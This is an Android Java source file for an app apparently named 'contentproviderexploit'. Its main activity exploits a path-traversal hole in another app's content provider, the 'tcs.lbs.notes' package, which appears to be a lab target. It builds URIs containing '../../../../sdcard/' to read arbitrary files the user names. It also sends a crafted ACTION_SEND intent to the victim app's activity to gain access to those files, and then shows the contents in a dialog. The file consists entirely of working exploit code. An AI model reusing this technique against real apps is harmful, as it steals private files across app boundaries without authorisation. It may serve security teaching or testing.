package tcs.lbs.contentproviderexploit;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.annotation.SuppressLint;
import android.content.ContentProviderClient;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.widget.EditText;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class MainActivity extends AppCompatActivity
{
    EditText queryEditText;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        queryEditText = findViewById(R.id.query_editText);
        queryEditText.setText("target.txt");
    }

    public void queryContentProvider_onClicked(android.view.View view) throws IOException, RemoteException {
        @SuppressLint("Recycle") ContentProviderClient providerClient = getContentResolver().acquireContentProviderClient(Uri.parse("content://tcs.lbs.notes/../../../../sdcard/" + queryEditText.getText().toString()));

        ParcelFileDescriptor descriptor = providerClient.openFile(Uri.parse("content://tcs.lbs.notes/../../../../sdcard/" + queryEditText.getText().toString()), "r");
        FileInputStream inputStream = new FileInputStream(descriptor.getFileDescriptor());

        StringBuilder builder = new StringBuilder();

        int next_char;
        while((next_char = inputStream.read()) != -1){
            builder.append((char) next_char);
        }

        AlertDialog.Builder builder1 = new AlertDialog.Builder(this);
        builder1.setMessage(builder.toString());
        builder1.setCancelable(true);

        builder1.setPositiveButton(
                "OK",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        dialog.cancel();
                    }
                });

        AlertDialog alert11 = builder1.create();
        alert11.show();
    }

    public void accessContentProvider_onClicked(android.view.View view) throws IOException, RemoteException {
        final String URL = "content://tcs.lbs.notes/../../../../sdcard/target.txt";
        final Uri CONTENT_URI = Uri.parse(URL);

        Intent shareIntent = new Intent();
        shareIntent.setAction("tcs.lbs.notes.DataBaseManager");
        shareIntent.setClassName("tcs.lbs.notes", "tcs.lbs.notes.DataBaseActivity");

        shareIntent.setAction(Intent.ACTION_SEND);
        shareIntent.putExtra(Intent.EXTRA_STREAM, CONTENT_URI);
        shareIntent.setDataAndType(CONTENT_URI, "text/plain");
        shareIntent.putExtra("ACTION_NAME", "GET_CONTENT_PROVIDER");
        //shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        startActivityForResult(shareIntent, 2);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        assert data != null;
        Uri URI = data.getData();
        String mimeType = "text/plain";
        @SuppressLint("Recycle") ContentProviderClient providerClient = getContentResolver().acquireContentProviderClient(URI);
        String results = "";
        try {
            ParcelFileDescriptor descriptor = providerClient.openFile(URI, "r");
            FileInputStream inputStream = new FileInputStream(descriptor.getFileDescriptor());
            StringBuilder builder = new StringBuilder();

            int next_char;
            while((next_char = inputStream.read()) != -1){
                builder.append((char) next_char);
            }
            results = builder.toString();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        AlertDialog.Builder builder1 = new AlertDialog.Builder(this);
        builder1.setMessage(results);
        builder1.setCancelable(true);

        builder1.setPositiveButton(
                "OK",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        dialog.cancel();
                    }
                });
        AlertDialog alert11 = builder1.create();
        alert11.show();
    }
}

